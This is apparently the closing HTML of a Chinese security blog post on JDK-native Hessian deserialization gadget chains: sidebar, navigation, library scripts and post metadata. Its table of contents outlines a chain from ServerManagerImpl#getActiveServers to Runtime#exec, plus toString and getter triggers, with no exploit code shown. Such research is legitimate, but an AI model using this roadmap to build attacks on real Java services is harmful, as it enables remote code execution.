+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.</span> <span class="toc-text"> 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> hessian2反序列化流程简单分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sink%E7%82%B9getter%E8%A7%A6%E5%8F%91runtime"><span class="toc-number">3.</span> <span class="toc-text"> sink点–getter触发Runtime</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text"> 构造分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E6%9E%84%E9%80%A0"><span class="toc-number">3.2.</span> <span class="toc-text"> 链子构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servermanagerimplgetactiveservers-servertableentryisvalid"><span class="toc-number">3.2.1.</span> <span class="toc-text"> ServerManagerImpl#getActiveServers-&gt;ServerTableEntry#isValid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servertableentryisvalid-servertableentryactivate"><span class="toc-number">3.2.2.</span> <span class="toc-text"> ServerTableEntry#isValid-&gt;ServerTableEntry#activate</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#servertableentryactivate-runtimeexec"><span class="toc-number">3.2.3.</span> <span class="toc-text"> ServerTableEntry#activate-&gt;Runtime#exec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final"><span class="toc-number">3.3.</span> <span class="toc-text"> Final</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%88%96jackson%E8%A7%A6%E5%8F%91getter"><span class="toc-number">4.</span> <span class="toc-text"> fastJson或Jackson触发getter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jackson"><span class="toc-number">4.1.</span> <span class="toc-text"> Jackson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">4.2.</span> <span class="toc-text"> fastJson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91tostring"><span class="toc-number">5.</span> <span class="toc-text"> 触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashmap-audiofileformat-tostring"><span class="toc-number">5.1.</span> <span class="toc-text"> HashMap-&gt;AudioFileFormat-&gt;toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concurrenthashmap-audiofileformat-tostring"><span class="toc-number">5.2.</span> <span class="toc-text"> ConcurrentHashMap-&gt;AudioFileFormat-&gt;toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#audioformat"><span class="toc-number">5.2.1.</span> <span class="toc-text"> AudioFormat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xtring"><span class="toc-number">5.2.2.</span> <span class="toc-text"> Xtring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xstringforchars"><span class="toc-number">5.2.3.</span> <span class="toc-text"> XStringForChars</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashmap-xstringforfsb-tostring"><span class="toc-number">5.3.</span> <span class="toc-text"> HashMap-&gt;XStringForFSB-&gt;toString</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JAVA反序列化-Hessian反序列化JDK原生新链",
+          url: "http://example.com/2025/12/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JDK%E5%8E%9F%E7%94%9F%E6%96%B0%E9%93%BE/",
+          excerpt: "",
+          description: "",
+          stripContent: "总结：这些链好用是好用，也挺好理解，就是难找，有些类我都不知道拿来干嘛的  参考 从2025blackhat-jdd hessian反序列化jdk原生新链开始学习链子构造-先知社区 Black2025-JDD Hessian反序列化链-先知社区 依赖： 123456&amp;lt;!-- hessian --&amp;gt;  &amp;lt;dependency&amp;gt;      &amp;lt;groupId&amp;gt;com.caucho&amp;lt;/groupId&amp;gt;      &amp;lt;artifactId&amp;gt;hess",
+          date: "Thu Dec 25 2025 23:25:41 GMT+0800",
+          updated: "Fri Dec 26 2025 02:18:55 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
